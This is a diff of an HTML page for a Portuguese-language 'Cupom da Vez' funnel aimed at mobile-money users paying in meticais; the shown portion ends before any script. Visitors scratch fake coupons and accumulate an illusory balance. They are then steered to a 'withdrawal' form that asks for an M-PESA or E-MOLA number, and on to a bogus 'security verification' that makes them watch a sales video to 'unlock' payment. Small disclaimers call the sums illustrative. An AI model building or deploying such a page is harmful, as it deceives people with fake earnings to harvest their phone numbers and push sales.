@@ -1,64 +1,1374 @@
 <!DOCTYPE html>
-<html lang="pt-BR">
+<html lang="pt">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>Pronto para Começar?</title>
-  <style>
-    body {
-      background-color: #fff;
-      color: #000;
-      font-family: "Inter", Arial, sans-serif;
-      display: flex;
-      flex-direction: column;
-      align-items: center;
-      justify-content: center;
-      height: 100vh;
-      margin: 0;
-    }
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Cupom da Vez</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
 
-    h1 {
-      font-size: 2rem;
-      margin-bottom: 2rem;
-    }
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, sans-serif;
+            background-color: #ffffff;
+            min-height: 100vh;
+        }
 
-    a.button {
-      display: inline-flex;
-      align-items: center;
-      gap: 10px;
-      background-color: #facc15; /* amarelo */
-      color: #000;
-      text-decoration: none;
-      font-weight: 600;
-      padding: 14px 30px;
-      border-radius: 8px;
-      transition: transform 0.2s ease, box-shadow 0.2s ease;
-    }
+        .hidden {
+            display: none !important;
+        }
 
-    a.button:hover {
-      transform: scale(1.05);
-      box-shadow: 0 4px 10px rgba(0, 0, 0, 0.2);
-    }
+        .page {
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            padding: 1.5rem;
+        }
 
-    .circle {
-      background-color: #000;
-      color: #fff;
-      font-size: 0.9rem;
-      font-weight: bold;
-      width: 25px;
-      height: 25px;
-      border-radius: 50%;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-    }
-  </style>
+        .container {
+            max-width: 48rem;
+            width: 100%;
+            text-align: center;
+        }
+
+        .logo {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 0.5rem;
+            margin-bottom: 3rem;
+        }
+
+        .logo-text {
+            font-size: 2.5rem;
+            font-weight: bold;
+        }
+
+        .logo-text-black {
+            color: #000000;
+        }
+
+        .logo-text-gray {
+            color: #6b7280;
+        }
+
+        .logo-circle {
+            width: 3rem;
+            height: 3rem;
+            background-color: #fbbf24;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 1.875rem;
+            font-weight: bold;
+            color: #000000;
+        }
+
+        .btn {
+            padding: 1rem 2rem;
+            border-radius: 0.5rem;
+            font-weight: 600;
+            font-size: 1.125rem;
+            cursor: pointer;
+            border: none;
+            transition: all 0.3s;
+        }
+
+        .btn-yellow {
+            background-color: #fbbf24;
+            color: #000000;
+        }
+
+        .btn-yellow:hover {
+            background-color: #f59e0b;
+        }
+
+        .btn-green {
+            background-color: #10b981;
+            color: #ffffff;
+        }
+
+        .btn-green:hover {
+            background-color: #059669;
+        }
+
+        .btn-blue {
+            background-color: #3b82f6;
+            color: #ffffff;
+        }
+
+        .btn-blue:hover {
+            background-color: #2563eb;
+        }
+
+        .btn:disabled {
+            background-color: #d1d5db;
+            color: #6b7280;
+            cursor: not-allowed;
+        }
+
+        .input {
+            width: 100%;
+            padding: 1rem 1.5rem;
+            font-size: 1.125rem;
+            border: 2px solid #d1d5db;
+            border-radius: 0.5rem;
+            outline: none;
+        }
+
+        .input:focus {
+            border-color: #fbbf24;
+        }
+
+        .title {
+            font-size: 2rem;
+            font-weight: 600;
+            color: #000000;
+            margin: 1rem 0;
+        }
+
+        .subtitle {
+            font-size: 1.25rem;
+            color: #4b5563;
+            margin: 0.5rem 0;
+        }
+
+        .alert-box {
+            background: linear-gradient(to bottom right, #dbeafe, #bfdbfe);
+            border-left: 4px solid #3b82f6;
+            border-radius: 0.75rem;
+            padding: 1rem;
+            margin: 1.5rem 0;
+            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
+        }
+
+        .alert-text {
+            font-size: 0.875rem;
+            color: #1f2937;
+            font-weight: 500;
+            text-align: center;
+        }
+
+        .header {
+            background-color: #ffffff;
+            box-shadow: 0 1px 3px rgba(0, 0, 0, 0.1);
+            padding: 1rem 1.5rem;
+            position: sticky;
+            top: 0;
+            z-index: 10;
+        }
+
+        .header-content {
+            max-width: 48rem;
+            margin: 0 auto;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+
+        .header-logo {
+            display: flex;
+            align-items: center;
+            gap: 0.5rem;
+        }
+
+        .header-logo-text {
+            font-size: 1.5rem;
+            font-weight: bold;
+        }
+
+        .header-logo-circle {
+            width: 2rem;
+            height: 2rem;
+            background-color: #fbbf24;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 1.125rem;
+            font-weight: bold;
+        }
+
+        .balance {
+            text-align: right;
+        }
+
+        .balance-label {
+            font-size: 0.875rem;
+            color: #6b7280;
+        }
+
+        .balance-value {
+            font-size: 1.25rem;
+            font-weight: bold;
+            color: #059669;
+            background-color: #fef3c7;
+            padding: 0.25rem 1rem;
+            border-radius: 9999px;
+        }
+
+        .card {
+            background-color: #ffffff;
+            border-radius: 1rem;
+            box-shadow: 0 10px 15px rgba(0, 0, 0, 0.1);
+            padding: 2rem;
+            margin: 1.5rem 0;
+        }
+
+        .progress-dots {
+            display: flex;
+            justify-content: center;
+            gap: 0.5rem;
+            margin: 1rem 0;
+        }
+
+        .dot {
+            width: 0.75rem;
+            height: 0.75rem;
+            border-radius: 50%;
+            transition: background-color 0.3s;
+        }
+
+        .dot-active {
+            background-color: #10b981;
+        }
+
+        .dot-current {
+            background-color: #fbbf24;
+        }
+
+        .dot-inactive {
+            background-color: #d1d5db;
+        }
+
+        .scratch-container {
+            position: relative;
+            user-select: none;
+        }
+
+        .scratch-content {
+            background-color: #ffffff;
+            border-radius: 1rem;
+            overflow: hidden;
+            box-shadow: 0 20px 25px rgba(0, 0, 0, 0.15);
+        }
+
+        .scratch-image {
+            width: 100%;
+            height: 16rem;
+            object-fit: cover;
+            background-color: #f3f4f6;
+        }
+
+        .scratch-image-header {
+            position: absolute;
+            top: 1rem;
+            left: 1rem;
+            right: 1rem;
+            background-color: rgba(255, 255, 255, 0.8);
+            padding: 0.5rem;
+            border-radius: 0.5rem;
+            text-align: center;
+            font-size: 0.875rem;
+            font-weight: 600;
+            color: #1f2937;
+        }
+
+        .scratch-barcode {
+            background-color: #ffffff;
+            padding: 1rem;
+        }
+
+        .barcode {
+            background-color: #000000;
+            color: #ffffff;
+            padding: 0.75rem;
+            text-align: center;
+            font-family: 'Courier New', monospace;
+            font-size: 1.25rem;
+            letter-spacing: 0.1em;
+        }
+
+        .scratch-canvas {
+            position: absolute;
+            inset: 0;
+            width: 100%;
+            height: 100%;
+            cursor: pointer;
+            touch-action: none;
+            border-radius: 1rem;
+        }
+
+        .celebration-overlay {
+            position: fixed;
+            inset: 0;
+            z-index: 50;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            background-color: rgba(0, 0, 0, 0.8);
+            backdrop-filter: blur(4px);
+            animation: fadeIn 0.3s ease-out;
+        }
+
+        .celebration-card {
+            background: linear-gradient(to bottom right, #fbbf24, #fcd34d, #f59e0b);
+            border-radius: 1.5rem;
+            box-shadow: 0 25px 50px rgba(0, 0, 0, 0.25);
+            max-width: 28rem;
+            width: 90%;
+            padding: 2rem;
+            transform: scale(0.5);
+            opacity: 0;
+            animation: scaleIn 0.5s ease-out forwards;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; }
+            to { opacity: 1; }
+        }
+
+        @keyframes scaleIn {
+            to {
+                transform: scale(1);
+                opacity: 1;
+            }
+        }
+
+        @keyframes bounce {
+            0%, 100% { transform: translateY(0); }
+            50% { transform: translateY(-10px); }
+        }
+
+        @keyframes pulse {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.5; }
+        }
+
+        @keyframes ping {
+            0% {
+                transform: scale(1);
+                opacity: 1;
+            }
+            75%, 100% {
+                transform: scale(2);
+                opacity: 0;
+            }
+        }
+
+        .animate-bounce {
+            animation: bounce 1s infinite;
+        }
+
+        .animate-pulse {
+            animation: pulse 2s infinite;
+        }
+
+        .animate-ping {
+            animation: ping 1s infinite;
+        }
+
+        .security-page {
+            background-color: #111827;
+            padding: 2rem 1rem;
+        }
+
+        .security-card {
+            background-color: #ffffff;
+            border-radius: 1.5rem;
+            box-shadow: 0 25px 50px rgba(0, 0, 0, 0.25);
+            overflow: hidden;
+            max-width: 48rem;
+            margin: 0 auto;
+        }
+
+        .security-header {
+            background: linear-gradient(to right, #fb923c, #f87171, #ef4444);
+            color: #ffffff;
+            padding: 2rem;
+            text-align: center;
+        }
+
+        .security-body {
+            padding: 2rem;
+        }
+
+        .info-box {
+            background: linear-gradient(to bottom right, #f0fdf4, #dcfce7);
+            border: 2px solid #86efac;
+            border-radius: 1rem;
+            padding: 1.5rem;
+            margin: 1rem 0;
+        }
+
+        .warning-box {
+            background: linear-gradient(to bottom right, #fffbeb, #fef3c7);
+            border: 2px solid #fcd34d;
+            border-radius: 1rem;
+            padding: 1.5rem;
+            margin: 1rem 0;
+        }
+
+        .payment-method {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 1rem;
+            margin: 1rem 0;
+        }
+
+        .payment-btn {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            gap: 0.75rem;
+            padding: 1.5rem;
+            border-radius: 1rem;
+            border: 2px solid #d1d5db;
+            background-color: #ffffff;
+            cursor: pointer;
+            transition: all 0.3s;
+        }
+
+        .payment-btn:hover {
+            border-color: #9ca3af;
+        }
+
+        .payment-btn.selected-mpesa {
+            border-color: #9ca3af;
+            background-color: #f9fafb;
+        }
+
+        .payment-btn.selected-emola {
+            border-color: #3b82f6;
+            background-color: #eff6ff;
+        }
+
+        .video-container {
+            position: relative;
+            background-color: #111827;
+            border-radius: 1.5rem;
+            overflow: hidden;
+            box-shadow: 0 25px 50px rgba(0, 0, 0, 0.25);
+            margin: 1.5rem 0;
+        }
+
+        .video-wrapper {
+            width: 100%;
+            aspect-ratio: 16 / 9;
+        }
+
+        .footer {
+            position: fixed;
+            bottom: 0;
+            left: 0;
+            right: 0;
+            background-color: #ffffff;
+            border-top: 1px solid #e5e7eb;
+            padding: 0.75rem;
+            text-align: center;
+            font-size: 0.875rem;
+            color: #6b7280;
+        }
+
+        .error-text {
+            color: #dc2626;
+            font-size: 0.875rem;
+            margin-top: 0.5rem;
+            text-align: center;
+            font-weight: 600;
+        }
+
+        .money-falling {
+            position: absolute;
+            font-size: 2.5rem;
+            pointer-events: none;
+            animation: fall linear forwards;
+        }
+
+        @keyframes fall {
+            0% {
+                transform: translateY(0) rotate(0deg);
+                opacity: 1;
+            }
+            100% {
+                transform: translateY(100vh) rotate(360deg);
+                opacity: 0;
+            }
+        }
+
+        @media (max-width: 640px) {
+            .logo-text {
+                font-size: 2rem;
+            }
+
+            .logo-circle {
+                width: 2.5rem;
+                height: 2.5rem;
+                font-size: 1.5rem;
+            }
+
+            .title {
+                font-size: 1.5rem;
+            }
+
+            .subtitle {
+                font-size: 1rem;
+            }
+
+            .card {
+                padding: 1rem;
+            }
+
+            .scratch-image {
+                height: 12rem;
+            }
+        }
+    </style>
 </head>
 <body>
-  <h1>Pronto para começar?</h1>
-  <a href="https://main.visionpub.online/" class="button">
-    <div class="circle">1</div>
-    COMEÇAR AGORA
-  </a>
+
+<!-- Welcome Page -->
+<div id="page-welcome" class="page">
+    <div class="container">
+        <div class="logo">
+            <span class="logo-text logo-text-black">cupom</span>
+            <div class="logo-circle">$</div>
+            <span class="logo-text logo-text-gray">DA VEZ</span>
+        </div>
+
+        <div style="margin-top: 3rem;">
+            <h1 class="title">Bem-vindo!</h1>
+            <p class="subtitle">Que tal conhecer o Cupom da Vez?</p>
+        </div>
+
+        <div style="margin-top: 2rem;">
+            <button class="btn btn-yellow" onclick="goToPage('name')" style="display: flex; align-items: center; justify-content: center; gap: 0.75rem; margin: 0 auto;">
+                <span style="width: 2rem; height: 2rem; background-color: #000000; color: #ffffff; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-size: 0.875rem; font-weight: bold;">1</span>
+                COMEÇAR AGORA
+            </button>
+        </div>
+
+        <div style="margin-top: 3rem; font-size: 0.875rem;">
+            <p style="font-weight: 600; color: #000000;">Suas informações estão 100% protegidas!</p>
+            <p style="color: #4b5563; margin-top: 0.75rem;">
+                Este site é seguro e possui Certificado SSL.<br>
+                Sua privacidade é totalmente garantida por nossa política de segurança.
+            </p>
+        </div>
+    </div>
+</div>
+
+<!-- Name Page -->
+<div id="page-name" class="page hidden">
+    <div class="container">
+        <div class="logo" style="margin-bottom: 3rem;">
+            <span class="logo-text logo-text-black" style="font-size: 2rem;">cupom</span>
+            <div class="logo-circle" style="width: 2.5rem; height: 2.5rem; font-size: 1.5rem;">$</div>
+            <span class="logo-text logo-text-gray" style="font-size: 2rem;">DA VEZ</span>
+        </div>
+
+        <div>
+            <h1 class="title">Olá! Como você se chama?</h1>
+            <p class="subtitle">Vamos personalizar sua experiência.</p>
+        </div>
+
+        <form onsubmit="submitName(event)" style="margin-top: 2rem;">
+            <input type="text" id="nameInput" class="input" placeholder="Digite seu nome" required style="margin-bottom: 1.5rem;">
+            <button type="submit" class="btn btn-yellow" style="width: 100%;">Continuar...</button>
+        </form>
+    </div>
+</div>
+
+<!-- Coupon Page -->
+<div id="page-coupon" class="hidden" style="background-color: #f9fafb; min-height: 100vh;">
+    <div class="header">
+        <div class="header-content">
+            <div class="header-logo">
+                <span class="header-logo-text logo-text-black">cupom</span>
+                <div class="header-logo-circle">$</div>
+                <span class="header-logo-text logo-text-gray">DA VEZ</span>
+            </div>
+            <div class="balance">
+                <p class="balance-label">Olá, <span id="userName"></span></p>
+                <p class="balance-value"><span id="totalValue">0</span> MTS</p>
+            </div>
+        </div>
+    </div>
+
+    <div style="max-width: 48rem; margin: 0 auto; padding: 2rem 1rem;">
+        <div class="alert-box">
+            <p class="alert-text">⚠️ <strong>Nota Importante:</strong> Os valores apresentados são meramente ilustrativos e não representam ganhos reais. Esta é apenas uma demonstração.</p>
+        </div>
+
+        <div class="card">
+            <h2 style="font-size: 1.5rem; font-weight: bold; color: #10b981; text-align: center; margin-bottom: 1rem;">
+                NOVO CUPOM ENCONTRADO!
+            </h2>
+
+            <div class="progress-dots" id="progressDots"></div>
+
+            <p style="text-align: center; font-size: 0.875rem; color: #4b5563; font-weight: 500; margin-bottom: 1rem;">
+                Cupom <span id="currentCouponNumber">1</span> de 6
+            </p>
+
+            <div style="background: linear-gradient(to bottom right, #fbcfe8, #fce7f3, #ddd6fe); border-radius: 1.5rem; padding: 1.5rem; margin-bottom: 1rem;">
+                <div class="scratch-container" id="scratchContainer">
+                    <div class="scratch-content">
+                        <div style="position: relative; height: 16rem; background-color: #f3f4f6;">
+                            <img id="productImage" class="scratch-image" src="" alt="Product">
+                            <div class="scratch-image-header">
+                                DIGITE O CUPOM DE DESCONTO DESSE PRODUTO
+                            </div>
+                        </div>
+                        <div class="scratch-barcode">
+                            <div class="barcode" id="barcodeDisplay"></div>
+                        </div>
+                    </div>
+                    <canvas id="scratchCanvas" class="scratch-canvas"></canvas>
+                </div>
+            </div>
+
+            <div id="scratchHint" style="text-align: center; margin: 1rem 0;">
+                <p style="font-size: 1.125rem; font-weight: bold; color: #4b5563;">
+                    👆 Passe o dedo na imagem para revelar o cupom
+                </p>
+            </div>
+
+            <div id="couponForm" class="hidden">
+                <div style="display: flex; align-items: center; justify-content: center; gap: 0.5rem; color: #2563eb; margin-bottom: 1rem;">
+                    <span style="font-size: 1.25rem;">↓</span>
+                    <p style="font-weight: 500;">Digite o código da imagem acima</p>
+                    <span style="font-size: 1.25rem;">↓</span>
+                </div>
+
+                <form onsubmit="validateCoupon(event)">
+                    <input type="text" id="couponCode" class="input" placeholder="Digite os 8 números" maxlength="8" style="text-align: center; margin-bottom: 0.5rem;">
+                    <p id="couponError" class="error-text hidden"></p>
+
+                    <div style="display: flex; align-items: center; gap: 0.75rem; background-color: #fef2f2; border: 1px solid #fecaca; border-radius: 0.5rem; padding: 1rem; margin: 1rem 0;">
+                        <div style="width: 2rem; height: 2rem; background-color: #ef4444; border-radius: 50%; display: flex; align-items: center; justify-content: center; flex-shrink: 0;">
+                            <span style="color: #ffffff; font-size: 1.25rem;">⊙</span>
+                        </div>
+                        <p id="productName" style="font-weight: 600; color: #000000;"></p>
+                    </div>
+
+                    <p style="text-align: center; font-size: 1.5rem; font-weight: bold; color: #ca8a04; margin: 1rem 0;">
+                        Valor a ganhar: <span id="couponValue">0</span> MTS
+                    </p>
+
+                    <button type="submit" id="validateBtn" class="btn btn-green" style="width: 100%;" disabled>
+                        Validar Cupão
+                    </button>
+                </form>
+            </div>
+        </div>
+    </div>
+</div>
+
+<!-- Celebration Overlay -->
+<div id="celebration" class="celebration-overlay hidden">
+    <div class="celebration-card">
+        <div style="text-align: center;">
+            <div style="position: relative; margin-bottom: 1.5rem;">
+                <div style="font-size: 5rem; margin: 0 auto;">🏆</div>
+            </div>
+
+            <div style="margin-bottom: 1.5rem;">
+                <h2 style="font-size: 2.5rem; font-weight: bold; color: #000000;">PARABÉNS! 🎉</h2>
+                <p style="font-size: 1.25rem; font-weight: 600; color: #1f2937; margin-top: 0.5rem;">
+                    Cupom Validado com Sucesso!
+                </p>
+            </div>
+
+            <div style="background-color: rgba(255, 255, 255, 0.9); backdrop-filter: blur(8px); border-radius: 1rem; padding: 1.5rem; box-shadow: 0 10px 15px rgba(0, 0, 0, 0.1); margin-bottom: 1.5rem;">
+                <div style="display: flex; align-items: center; justify-content: center; gap: 0.5rem; margin-bottom: 0.75rem;">
+                    <span style="font-size: 1.5rem;">💰</span>
+                    <p style="color: #4b5563; font-weight: 500;">Você ganhou:</p>
+                </div>
+
+                <div style="background: linear-gradient(to right, #34d399, #10b981); border-radius: 0.75rem; padding: 1rem 1.5rem; box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1); margin-bottom: 1rem;">
+                    <p id="celebrationValue" style="font-size: 3rem; font-weight: bold; color: #ffffff; text-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);">
+                        0 MTS
+                    </p>
+                </div>
+
+                <div style="padding-top: 0.5rem;">
+                    <p style="font-size: 0.875rem; color: #6b7280; font-weight: 500;">Produto:</p>
+                    <p id="celebrationProduct" style="font-size: 1.125rem; font-weight: bold; color: #000000;">-</p>
+                </div>
+            </div>
+
+            <div style="display: flex; align-items: center; justify-content: center; gap: 0.5rem; margin-bottom: 1.5rem;">
+                <div class="animate-ping" style="width: 0.75rem; height: 0.75rem; background-color: #10b981; border-radius: 50%;"></div>
+                <p style="color: #000000; font-weight: 600;">Valor adicionado ao saldo!</p>
+                <div class="animate-ping" style="width: 0.75rem; height: 0.75rem; background-color: #10b981; border-radius: 50%;"></div>
+            </div>
+
+            <button id="celebrationBtn" class="btn btn-green hidden" onclick="continueCelebration()" style="width: 100%; display: flex; align-items: center; justify-content: center; gap: 0.5rem;">
+                <span style="font-size: 1.125rem;">Continuar</span>
+                <span>→</span>
+            </button>
+        </div>
+        <div id="moneyFall" style="position: absolute; top: 0; left: 0; width: 100%; height: 100%; pointer-events: none; overflow: hidden; border-radius: 1.5rem;"></div>
+    </div>
+</div>
+
+<!-- Limit Page -->
+<div id="page-limit" class="page hidden" style="background-color: #f9fafb;">
+    <div class="container">
+        <div class="logo" style="margin-bottom: 3rem;">
+            <span class="logo-text logo-text-black">cupom</span>
+            <div class="logo-circle">$</div>
+            <span class="logo-text logo-text-gray">DA VEZ</span>
+        </div>
+
+        <div class="alert-box">
+            <p class="alert-text">⚠️ <strong>Nota Importante:</strong> Os valores apresentados são meramente ilustrativos e não representam ganhos reais. Esta é apenas uma demonstração.</p>
+        </div>
+
+        <div>
+            <h1 class="title" style="font-size: 2.5rem;">Limite Diário Atingido!</h1>
+            <p class="subtitle">Você atingiu o limite de cupões diários.</p>
+        </div>
+
+        <div style="background: linear-gradient(to bottom right, #d1fae5, #ecfdf5); border: 2px solid #86efac; border-radius: 1rem; padding: 2rem; margin: 2rem 0;">
+            <p style="font-size: 1.125rem; color: #4b5563; font-weight: 500; margin-bottom: 1rem;">
+                Saldo Total Acumulado:
+            </p>
+            <div style="background: linear-gradient(to right, #fef3c7, #ffffff, #fef3c7); border-radius: 0.75rem; padding: 1rem 1.5rem;">
+                <p id="limitTotalValue" style="font-size: 3rem; font-weight: bold; color: #10b981;">0 MTS</p>
+            </div>
+        </div>
+
+        <div style="display: flex; align-items: center; justify-content: center; gap: 0.5rem; color: #2563eb; padding: 1rem 0;">
+            <span style="font-size: 1.25rem;">↓</span>
+            <p style="font-weight: 500; font-size: 1.125rem;">Realize o seu saque abaixo</p>
+            <span style="font-size: 1.25rem;">↓</span>
+        </div>
+
+        <button class="btn btn-yellow" onclick="goToPage('withdraw')" style="width: 100%; font-size: 1.25rem; padding: 1.25rem 2rem; border-radius: 0.75rem; box-shadow: 0 10px 15px rgba(0, 0, 0, 0.1);">
+            REALIZAR SAQUE
+        </button>
+    </div>
+</div>
+
+<!-- Withdraw Page -->
+<div id="page-withdraw" class="page hidden" style="background-color: #f9fafb;">
+    <div style="max-width: 32rem; width: 100%; background-color: #ffffff; border-radius: 1.5rem; box-shadow: 0 20px 25px rgba(0, 0, 0, 0.15); padding: 2rem;">
+        <div class="alert-box">
+            <p class="alert-text">⚠️ <strong>Nota Importante:</strong> Os valores apresentados são meramente ilustrativos e não representam ganhos reais. Esta é apenas uma demonstração.</p>
+        </div>
+
+        <div style="text-align: center; margin-bottom: 2rem;">
+            <h1 style="font-size: 2rem; font-weight: bold; color: #000000; margin-bottom: 0.75rem;">
+                Solicitar Saque
+            </h1>
+            <p style="font-size: 1.125rem; color: #6b7280;">
+                Sistema de Pagamento Seguro
+            </p>
+        </div>
+
+        <div style="background: linear-gradient(to bottom right, #ecfdf5, #d1fae5); border: 2px solid #bbf7d0; border-radius: 1rem; padding: 1.5rem; margin-bottom: 2rem;">
+            <p style="color: #4b5563; font-weight: 500; margin-bottom: 0.5rem;">
+                Valor Disponível:
+            </p>
+            <p id="withdrawTotalValue" style="font-size: 3rem; font-weight: bold; color: #10b981;">
+                MTS 0
+            </p>
+        </div>
+
+        <form onsubmit="submitWithdraw(event)">
+            <div style="margin-bottom: 1.5rem;">
+                <label style="display: block; font-size: 1.25rem; font-weight: bold; color: #000000; margin-bottom: 1rem;">
+                    Escolha o método de saque:
+                </label>
+
+                <div class="payment-method">
+                    <button type="button" id="mpesaBtn" class="payment-btn" onclick="selectPayment('mpesa')">
+                        <span style="font-size: 2.5rem;">📱</span>
+                        <span style="font-weight: bold; font-size: 1.125rem; color: #000000;">M-PESA</span>
+                    </button>
+
+                    <button type="button" id="emolaBtn" class="payment-btn selected-emola" onclick="selectPayment('emola')">
+                        <span style="font-size: 2.5rem;">📱</span>
+                        <span style="font-weight: bold; font-size: 1.125rem; color: #000000;">E-MOLA</span>
+                    </button>
+                </div>
+            </div>
+
+            <div style="margin-bottom: 1.5rem;">
+                <label style="display: block; font-size: 1.25rem; font-weight: bold; color: #000000; margin-bottom: 0.75rem;">
+                    <span id="paymentLabel">Número do E-MOLA</span>
+                </label>
+                <input type="tel" id="phoneNumber" class="input" placeholder="86xxxxxxxx ou 87xxxxxxxx" maxlength="9" style="background-color: #f9fafb; color: #374151;">
+                <p id="phoneHint" style="font-size: 0.875rem; color: #6b7280; margin-top: 0.75rem;">
+                    Digite o número iniciado com 86 ou 87 (9 dígitos)
+                </p>
+            </div>
+
+            <button type="submit" class="btn btn-blue" style="width: 100%; padding: 1.25rem 2rem; box-shadow: 0 10px 15px rgba(0, 0, 0, 0.1); display: flex; align-items: center; justify-content: center; gap: 0.75rem;">
+                <span style="font-size: 1.5rem;">💳</span>
+                Confirmar e Sacar
+            </button>
+        </form>
+    </div>
+</div>
+
+<!-- Security Page -->
+<div id="page-security" class="security-page hidden">
+    <div class="security-card">
+        <div class="security-header">
+            <div style="font-size: 4rem; margin-bottom: 1rem;">🔒</div>
+            <h1 style="font-size: 2rem; font-weight: bold; display: flex; align-items: center; justify-content: center; gap: 0.5rem;">
+                <span style="font-size: 2rem;">🔒</span>
+                Verificação de Segurança
+            </h1>
+        </div>
+
+        <div class="security-body">
+            <div class="alert-box">
+                <p class="alert-text">⚠️ <strong>Nota Importante:</strong> Os valores apresentados são meramente ilustrativos e não representam ganhos reais. Esta é apenas uma demonstração.</p>
+            </div>
+
+            <div style="text-align: center; margin: 1.5rem 0;">
+                <p style="color: #4b5563;">Valor demonstrativo acumulado:</p>
+                <div style="display: flex; align-items: center; justify-content: center; gap: 0.5rem; margin-top: 0.5rem;">
+                    <span style="font-size: 2rem;">💰</span>
+                    <p id="securityTotalValue" style="font-size: 3rem; font-weight: bold; color: #10b981;">0 MTS</p>
+                </div>
+            </div>
+
+            <p style="text-align: center; color: #4b5563; font-size: 1.125rem; margin: 1.5rem 0;">
+                Precisamos confirmar sua identidade antes de prosseguir.
+            </p>
+
+            <div style="background-color: #f9fafb; border-radius: 0.75rem; padding: 1rem; margin: 1.5rem 0;">
+                <p style="color: #4b5563; display: flex; align-items: start; gap: 0.5rem;">
+                    <span style="color: #9ca3af; margin-top: 0.25rem;">○</span>
+                    <span>Para garantir a segurança da sua conta, vamos realizar uma verificação de identidade simples.</span>
+                </p>
+            </div>
+
+            <div class="info-box">
+                <div style="display: flex; align-items: start; gap: 0.75rem;">
+                    <span style="font-size: 1.5rem; color: #10b981; flex-shrink: 0; margin-top: 0.25rem;">✓</span>
+                    <div>
+                        <p style="font-weight: bold; color: #000000; font-size: 1.125rem; margin-bottom: 0.75rem;">
+                            Esta verificação existe para proteger sua conta contra:
+                        </p>
+                        <div style="margin-left: 1rem;">
+                            <p style="color: #4b5563; margin-bottom: 0.5rem; display: flex; align-items: start; gap: 0.5rem;">
+                                <span style="color: #10b981; margin-top: 0.25rem;">✓</span>
+                                <span>Acessos não autorizados por terceiros</span>
+                            </p>
+                            <p style="color: #4b5563; margin-bottom: 0.5rem; display: flex; align-items: start; gap: 0.5rem;">
+                                <span style="color: #10b981; margin-top: 0.25rem;">✓</span>
+                                <span>Atividades automatizadas suspeitas no sistema</span>
+                            </p>
+                            <p style="color: #4b5563; display: flex; align-items: start; gap: 0.5rem;">
+                                <span style="color: #10b981; margin-top: 0.25rem;">✓</span>
+                                <span>Uso indevido de perfis falsos ou duplicados</span>
+                            </p>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="warning-box">
+                <div style="display: flex; align-items: start; gap: 0.75rem;">
+                    <span style="font-size: 1.5rem; color: #f59e0b; flex-shrink: 0; margin-top: 0.25rem;">⚠</span>
+                    <div>
+                        <p style="font-weight: bold; color: #000000; font-size: 1.125rem; margin-bottom: 0.75rem;">
+                            Informações Importantes:
+                        </p>
+                        <div style="margin-left: 1rem;">
+                            <p style="color: #4b5563; margin-bottom: 0.5rem; display: flex; align-items: start; gap: 0.5rem;">
+                                <span style="color: #10b981; margin-top: 0.25rem;">✓</span>
+                                <span>A verificação é rápida e segura.</span>
+                            </p>
+                            <p style="color: #4b5563; margin-bottom: 0.5rem; display: flex; align-items: start; gap: 0.5rem;">
+                                <span style="color: #10b981; margin-top: 0.25rem;">✓</span>
+                                <span>Seus dados pessoais são protegidos.</span>
+                            </p>
+                            <p style="color: #4b5563; display: flex; align-items: start; gap: 0.5rem;">
+                                <span style="color: #10b981; margin-top: 0.25rem;">✓</span>
+                                <span>Este processo garante a autenticidade da sua conta.</span>
+                            </p>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div style="text-align: center; margin: 2rem 0 1rem;">
+                <p style="font-weight: bold; color: #000000; font-size: 1.25rem; display: flex; align-items: center; justify-content: center; gap: 0.5rem;">
+                    <span>👇</span>
+                    Próximo Passo
+                </p>
+                <p style="color: #4b5563; margin-top: 0.5rem;">
+                    Clique no botão abaixo para completar a verificação de identidade e prosseguir.
+                </p>
+            </div>
+
+            <button class="btn btn-green" onclick="goToPage('video')" style="width: 100%; padding: 1.25rem 2rem; border-radius: 1rem; box-shadow: 0 10px 15px rgba(0, 0, 0, 0.1); font-size: 1.125rem;">
+                Completar Verificação
+            </button>
+        </div>
+    </div>
+</div>
+
+<!-- Video Page -->
+<div id="page-video" class="hidden" style="background-color: #ffffff; min-height: 100vh;">
+    <div class="header">
+        <div class="header-content">
+            <div class="header-logo">
+                <span class="header-logo-text logo-text-black">cupom</span>
+                <div class="header-logo-circle">$</div>
+                <span class="header-logo-text logo-text-gray">DA VEZ</span>
+            </div>
+            <div class="balance">
+                <p class="balance-label">Saldo:</p>
+                <p class="balance-value">MTS <span id="videoTotalValue">0</span></p>
+            </div>
+        </div>
+    </div>
+
+    <div style="max-width: 48rem; margin: 0 auto; padding: 2rem 1rem;">
+        <div class="alert-box">
+            <p class="alert-text">⚠️ <strong>Nota Importante:</strong> Os valores apresentados são meramente ilustrativos e não representam ganhos reais. Esta é apenas uma demonstração.</p>
+        </div>
+
+        <div class="video-container">
+            <div class="video-wrapper">
+                <vturb-smartplayer id="vid-6900f7e324bb6d6db57759eb" style="display: block; margin: 0 auto; width: 100%;"></vturb-smartplayer>
+            </div>
+        </div>
+
+        <div class="warning-box" style="display: flex; align-items: start; gap: 1rem;">
+            <span style="font-size: 2rem; color: #f59e0b; flex-shrink: 0; margin-top: 0.25rem;">⚠</span>
+            <div>
+                <p style="font-size: 1.25rem; font-weight: bold; color: #000000; margin-bottom: 0.5rem;">
+                    Assista esse vídeo até o final para liberar o seu saque!
+                </p>
+                <p style="color: #4b5563;">
+                    É importante assistir o vídeo completo para continuar com o processo de saque.
+                </p>
+            </div>
+        </div>
+
